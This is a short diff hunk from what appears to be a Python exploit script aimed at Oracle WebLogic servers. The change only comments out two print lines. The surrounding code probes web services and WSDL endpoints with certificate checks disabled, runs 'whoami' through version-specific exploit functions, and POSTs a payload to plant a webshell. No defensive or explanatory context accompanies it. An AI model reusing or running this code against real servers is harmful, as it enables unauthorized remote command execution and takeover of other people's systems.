@@ -80,12 +80,12 @@ def get_webshell_test(url):
         r0 = requests.get(url, headers=headers,timeout = 10,verify=False)
         r2 = requests.get(u2, headers=headers,timeout = 10,verify=False)
         if r2.status_code == 200 and 'Web Services' in r2.text:
-            print(u2)
+            #print(u2)
             cmd = 'whoami'
             if weblogic_10_3_6(u2,cmd):
                 weblogic_12_1_3(u2,cmd)
         if r0.status_code == 200 and 'WSDL' in r0.text:
-            print(url)
+            #print(url)
             r1 = requests.post(url, headers=headers,data=PAYLOAD,timeout = 10,verify=False)
             if r1.status_code == 202:
                 if 'https' in url:
